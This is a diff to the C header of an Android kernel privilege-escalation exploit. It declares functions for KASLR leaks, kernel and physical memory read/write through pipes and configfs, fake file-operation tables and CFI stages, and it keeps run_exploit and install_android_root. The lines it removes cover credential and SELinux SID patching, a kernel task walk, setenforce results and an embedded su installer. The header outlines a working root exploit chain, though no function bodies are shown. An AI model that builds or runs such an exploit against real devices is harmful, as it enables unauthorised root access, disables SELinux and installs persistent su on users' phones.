@@ -2,7 +2,6 @@
 #define COMMON_H
 
 #define _GNU_SOURCE
-#define __ARM 1
 
 #include "offset.h"
 
@@ -73,18 +72,6 @@
 #define ASHMEM_NAME_PREFIX_LEN 11
 #define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
 
-#define TASK_COMM_LEN 16
-#define SELINUX_KERNEL_SID 1
-#define INIT_TASK_TASKS (INIT_TASK + TASK_TASKS_OFF)
-#define SECURITY_CAPABLE_HEAD (SECURITY_HOOK_HEADS + 0x40)
-#define CAP_FULL 0x000001ffffffffffULL
-#define CRED_CAP_WORDS 5
-#define CRED_CAP_INHERITABLE 0
-#define CRED_CAP_PERMITTED 1
-#define CRED_CAP_EFFECTIVE 2
-#define CRED_CAP_BSET 3
-#define CRED_CAP_AMBIENT 4
-
 #define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
 #define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
 #define KMALLOC_NORMAL_TYPE 0
@@ -100,7 +87,6 @@
 
 #define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
 #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
-#define PAGE_TYPE_SLAB 0xf5
 
 #define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
 #define PIPE_SCAN_CHUNK 0x400
@@ -144,7 +130,6 @@
 #ifndef ROUTE_WAIT_SECONDS
 #define ROUTE_WAIT_SECONDS 8
 #endif
-#define EARLY_PIPE_PREPARE 0
 #define SLIDE_NFULNL_LOGGER \
   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
 #define SLIDE_LOGGERS_0_1 P0_DATA_ALIAS_CONST(SLIDE_LOGGERS_0_1_IMAGE)
@@ -175,31 +160,6 @@ struct local_sched_attr {
   uint64_t sched_runtime;
   uint64_t sched_deadline;
   uint64_t sched_period;
-};
-
-struct root_report {
-  uint32_t uid_before;
-  uint32_t uid_after;
-  uint32_t gid_after;
-  uint32_t euid_after;
-  uint32_t egid_after;
-  int setgid_ret;
-  int setgid_errno;
-  int setuid_ret;
-  int setuid_errno;
-  int setenforce_ret;
-  int setenforce_errno;
-  int su_install_ret;
-  int su_install_errno;
-  pid_t su_daemon_pid;
-  int wallpaper_ret;
-  int wallpaper_errno;
-};
-
-struct root_shared {
-  atomic_int go;
-  atomic_int done;
-  struct root_report report;
 };
 
 struct mm_ctx {
@@ -255,18 +215,8 @@ extern uint64_t fops_before;
 extern uint64_t fops_after;
 extern int root_child_done;
 extern char ashmem_path[256];
-extern uint8_t selinux_before;
-extern uint8_t selinux_after;
 extern uint32_t root_uid_before;
 extern uint32_t root_uid_after;
-extern uint64_t capable_head_before;
-extern uint64_t capable_head_after;
-extern uint64_t init_tasks_prev;
-extern uint64_t last_task_guess;
-extern int setgid_ret;
-extern int setuid_ret;
-extern int setenforce_ret;
-extern int setenforce_errno;
 extern int cfi_attempts;
 extern int pipe_stage_attempts;
 extern int cfi_dirty_seen;
@@ -313,54 +263,18 @@ extern uint64_t physrw_write64_value;
 extern int physrw_read64_ok;
 extern int physrw_write64_ok;
 extern int kaslr_done;
-extern int kaslr_step;
-extern uint64_t kaslr_fops_alias;
-extern uint64_t kaslr_open_ptr;
-extern uint64_t kaslr_ioctl_ptr;
-extern uint64_t kaslr_mmap_ptr;
-extern uint64_t kaslr_release_ptr;
-extern uint64_t kaslr_show_fdinfo_ptr;
 extern uint64_t kaslr_base;
 extern uint64_t kaslr_slide;
-extern uint64_t kaslr_expected_ioctl;
-extern uint64_t kaslr_expected_mmap;
-extern uint64_t kaslr_expected_release;
-extern uint64_t kaslr_expected_show_fdinfo;
 extern uint64_t slide_bootid_before;
 extern uint64_t slide_bootid_after;
 extern uint64_t slide_bootid_want;
 extern ssize_t slide_bootid_restore_ret;
 extern uintptr_t slide_p0_offset;
-extern uint64_t current_task_addr;
-extern uint64_t current_cred_addr;
-extern uint64_t current_real_cred_addr;
-extern uint64_t current_cred_security_addr;
-extern uint64_t current_real_cred_security_addr;
-extern uint32_t cred_sid_before;
-extern uint32_t cred_sid_after;
-extern uint32_t real_cred_sid_before;
-extern uint32_t real_cred_sid_after;
-extern uint32_t target_cred_osid;
-extern uint32_t target_cred_sid;
-extern uint32_t selinux_cred_blob_off;
-extern int task_walk_iters;
-extern uint64_t task_walk_last_entry;
-extern uint32_t task_walk_last_pid;
-extern uint32_t task_walk_last_tgid;
-extern uint32_t found_task_pid;
-extern uint32_t found_task_tgid;
-extern char found_task_comm[TASK_COMM_LEN + 1];
-extern pid_t root_child_pid;
-extern int root_ready_pipe[2];
-extern struct root_shared *root_shared;
 extern int memfd_leak;
 
 int run_exploit(int argc, char **argv);
-int install_embedded_su(pid_t *daemon_pid);
-int install_embedded_wallpaper(void);
 void read_first_line(const char *path, char *buf, size_t len);
 void log_startup_context(void);
-void log_slide_child_context(void);
 void disable_rseq_for_thread(void);
 long futex_op(
     uint32_t *uaddr, int op, uint32_t val,
@@ -370,7 +284,6 @@ int try_cache_ashmem_path(const char *path);
 int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
 int open_ashmem_device(void);
-int has_zero_byte(uintptr_t value);
 uintptr_t p0_data_alias(uintptr_t image_addr);
 uintptr_t p0_alias_image_offset(uintptr_t data_alias);
 uintptr_t data_addr(uintptr_t image_addr);
@@ -392,7 +305,6 @@ void close_reclaim_sockets(void);
 void setup_kernelsnitch(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
-uintptr_t current_kernelsnitch_mm_struct(void);
 uintptr_t cleanup_kernelsnitch(void);
 void close_ctx_memfds(struct mm_ctx *ctx);
 void free_ctx_storage(struct mm_ctx *ctx);
@@ -404,44 +316,22 @@ uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
 
 void fdset_put_word(fd_set *set, int word, uint64_t value);
-uint64_t fdset_get_word(const fd_set *set, int word);
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
 
-int slide_pselect_words_per_set(void);
-int slide_pselect_global_word(int waiter_word);
-int slide_pselect_put_global_word(
-    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int global_word, uint64_t value);
-uint64_t slide_pselect_get_global_word(
-    const fd_set *in, const fd_set *out, const fd_set *ex,
-    int words_per_set, int global_word);
-void slide_pselect_put_waiter_word(
-    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
-    int waiter_word, uint64_t value, const char *name);
-void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
-void open_slide_selected_fds(
-    fd_set *in, fd_set *out, fd_set *ex, int read_fd);
-void slide_pselect_stack_copy(void);
-int hex_value(char c);
-uint64_t slide_read_stext(void);
-uint64_t slide_child_leak_stext(void);
 int slide_leak_kernel_base(void);
 
 ssize_t configfs_write_once(
     int fd, uintptr_t target, const void *data, size_t len);
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
-int is_kernel_ptr(uintptr_t value);
 int is_direct_ptr(uintptr_t value);
 uint64_t kernel_read64(int fd, uintptr_t target);
 ssize_t kernel_write_data(
     int fd, uintptr_t target, const void *data, size_t len);
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
 int repair_fake_fops_llseek(int fd);
-int refresh_fake_fops_text(int fd);
-int leak_kernel_base(int fd);
 int restore_slide_boot_id(int fd);
 int install_child_root(int fd);
 int try_cfi_stage(void);
@@ -476,16 +366,9 @@ int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
 int pipe_phys_write_data(
     int fd, uintptr_t direct_addr, const void *data, size_t len);
 uint64_t pipe_read64(int fd, uintptr_t direct_addr);
-uint32_t pipe_read32(int fd, uintptr_t direct_addr);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
 
-int spawn_root_child(void);
-int collect_root_child(void);
-uint64_t find_task_by_tgid(int fd, uint32_t want_tgid);
-int patch_cred_identity(int fd, uintptr_t cred);
-int patch_cred_sid(int fd, uintptr_t cred);
-int patch_cred_object(int fd, uintptr_t cred);
 int install_android_root(int fd);
 
 #endif
